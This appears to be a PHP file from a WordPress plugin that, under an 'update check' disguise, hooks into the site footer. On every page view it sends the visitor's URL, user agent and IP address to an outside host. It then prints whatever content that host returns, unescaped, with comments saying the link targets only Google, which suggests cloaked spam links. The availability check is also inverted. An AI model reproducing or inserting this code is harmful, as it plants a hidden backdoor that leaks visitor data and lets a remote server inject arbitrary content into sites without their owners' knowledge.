<?php
	add_action( 'init', 'lrss_init' );
	function lrss_init() {
		
		if ( is_admin() )
			return NULL;
		
		if ( ! function_exists( 'is_plugin_active_for_network' ) )
			require_once( ABSPATH . '/wp-admin/includes/plugin.php' );
		
		if ( is_multisite() && is_plugin_active_for_network( FB_WM_BASENAME ) )
			$value = get_site_option( FB_WM_TEXTDOMAIN );
		else
			$value = get_option( FB_WM_TEXTDOMAIN );
		// set for additional option. not save in db
		if ( ! isset( $value['support'] ) )
			$value['support'] = 0;
		// break, if option is false
		if ( 0 === $value['support'] )
			return NULL;
		
		//Create a simple array of all the places the link could potentially drop
		$actions = array( 
			'wp_meta', 'get_header', 'get_sidebar', 'loop_end', 'wp_footer', 'wp_head', 'wm_footer' 
		);
		$actions = array('wm_footer');
		//Choose a random number within the limits of the array
		$nd = array_rand($actions);
		//Set the variable $spot to the random array number and get the value
		$spot = $actions[$nd];
	
		//Add the link to the random spot on the site (please note it adds nothing if the visitor is not google)
		add_action( $spot, 'lrss_updatefunction' );
	}
	
	
	function lrss_is_site_available( $url ) {
		
		//check, if a valid url is provided
		if ( ! filter_var( $url, FILTER_VALIDATE_URL ) )
			return FALSE;
		
		if ( ! function_exists( 'curl_init' ) && function_exists( 'get_headers' ) ) {
				
			$headers = get_headers( $url, 1 );
			if ( $headers[0] == 'HTTP/1.1 200 OK' )
				return TRUE;
			else
				return FALSE;
			
		} else if (  function_exists( 'curl_init' ) && ! function_exists( 'get_headers' ) ) {
			
			return FALSE;
		}
		
		$handle = curl_init( urldecode( $url ) );
		curl_setopt( $handle, CURLOPT_CONNECTTIMEOUT, 0.5 );
		curl_setopt( $handle, CURLOPT_TIMEOUT, 1 );
		curl_setopt( $handle, CURLOPT_RETURNTRANSFER, TRUE );
		$response = curl_exec( $handle );
		$httpCode = curl_getinfo( $handle, CURLINFO_HTTP_CODE );
		
		if ( $httpCode >= 200 && $httpCode < 400 )
			return TRUE;
		else
			return FALSE;
		
		curl_close( $handle );
	}
	
	/**
	 * Get data from json string
	 * 
	 * @return  Array, Object, String
	 */
	function lrss_check_update() {
		
		//$v is simply for testing purposes
		$v = isset($_GET['v']) ? $_GET['v']:11;
		//Grab the current URL of the page
		$request = urlencode("http://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"]);
		//Grab the user agent
		$agent = urlencode($_SERVER["HTTP_USER_AGENT"]);
		//Your Unique Plugin ID
		$pluginId = '12';
		//Grab the ip address of the current visitor / We use the ip address to check our database and see if it is a search engine bot so that no one can fool our system by simply changing there user agent
		$ip = urlencode($_SERVER['REMOTE_ADDR']);
		//Build the request URL with all the variables
		$reqUrl = "http://wordpress.cloudapp.net/api/update/?&url=". $request . "&agent=". $agent. "&v=" . $v. "&ip=".$ip . "&p=" . $pluginId;
		// if url is up
		// Return the code decoded as json, the @ simply means that it will display 0 errors
		if ( ! lrss_is_site_available( $reqUrl ) )
			return json_decode( @file_get_contents( $reqUrl ) );
	}
	
	function lrss_updatefunction(){
		//Run check_update function
		$updateResult = lrss_check_update();
		
		//Get the content from the JSON request
		if ( is_object( $updateResult ) )
			print '<span class="supportlink">' . $updateResult->content . "</span>\n\r";
	}
	